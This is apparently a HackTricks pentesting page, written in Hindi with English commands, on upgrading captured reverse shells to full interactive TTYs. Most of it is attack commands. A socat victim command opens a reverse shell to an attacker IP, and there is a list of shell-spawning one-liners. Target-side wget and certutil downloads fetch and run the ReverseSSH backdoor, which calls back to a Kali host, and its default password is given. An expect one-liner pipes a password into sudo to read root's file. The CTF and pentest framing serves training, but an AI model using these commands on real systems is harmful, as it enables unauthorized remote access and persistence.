# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

ध्यान दें कि `SHELL` variable में सेट किया गया shell **अवश्य** _**/etc/shells**_ के **अंदर listed** होना चाहिए, अन्यथा `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported` संदेश दिखाई देगा। यह भी ध्यान दें कि अगले snippets केवल bash में काम करते हैं। यदि आप zsh में हैं, तो shell प्राप्त करने से पहले `bash` चलाकर bash में बदल जाएँ।

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!TIP]
> आप **`stty -a`** चलाकर **rows** और **columns** की **संख्या** प्राप्त कर सकते हैं।

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

**interactive shell access** के साथ-साथ **file transfers** और **port forwarding** के लिए target पर statically-linked ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) डालना एक सुविधाजनक तरीका है।<sup>[[1]](#references)</sup>

नीचे `x86` के लिए upx-compressed binaries का एक उदाहरण दिया गया है। अन्य binaries के लिए [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/) देखें।

1. ssh port forwarding request को catch करने के लिए locally तैयार करें:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux target:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows 10 target (earlier versions के लिए, [project readme](https://github.com/Fahrj/reverse-ssh#features) देखें):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- यदि ReverseSSH port forwarding request सफल रहा, तो अब आपको `reverse-ssh(.exe)` चलाने वाले user के context में default password `letmeinbrudipls` से लॉग इन करने में सक्षम होना चाहिए:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) Linux reverse shells को TTY में automatically upgrade करता है, terminal size को handle करता है, सब कुछ log करता है और भी बहुत कुछ। इसके अलावा, यह Windows shells के लिए readline support भी प्रदान करता है।<sup>[[2]](#references)</sup>

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

यदि किसी कारण से आपको full TTY नहीं मिल पाता है, तो भी आप उन **programs के साथ interact कर सकते हैं** जो user input की अपेक्षा करते हैं। निम्नलिखित उदाहरण में, किसी file को पढ़ने के लिए password को `sudo` में pass किया गया है:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## संदर्भ

- [1] [ReverseSSH - Statically-linked ssh server with reverse shell functionality for CTFs and such](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Shell handler that automates a few things to make life easier](https://github.com/brightio/penelope)

{{#include ../../banners/hacktricks-training.md}}
